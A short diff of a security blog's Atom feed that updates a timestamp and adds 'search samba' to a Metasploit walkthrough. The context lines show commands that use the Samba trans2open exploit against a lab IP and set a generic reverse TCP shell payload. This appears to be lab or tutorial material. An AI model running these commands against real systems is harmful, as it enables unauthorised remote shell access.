@@ -4,7 +4,7 @@
   <title><![CDATA[Category: smb | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/smb/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-06T15:01:54-05:00</updated>
+  <updated>2016-06-06T15:31:50-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -69,6 +69,7 @@
 <p>Now start Metasploit:</p>
 
 <pre><code>msfconsole
+search samba
 use exploit/linux/samba/trans2open
 set rhost 192.168.79.182
 set payload generic/shell_reverse_tcp
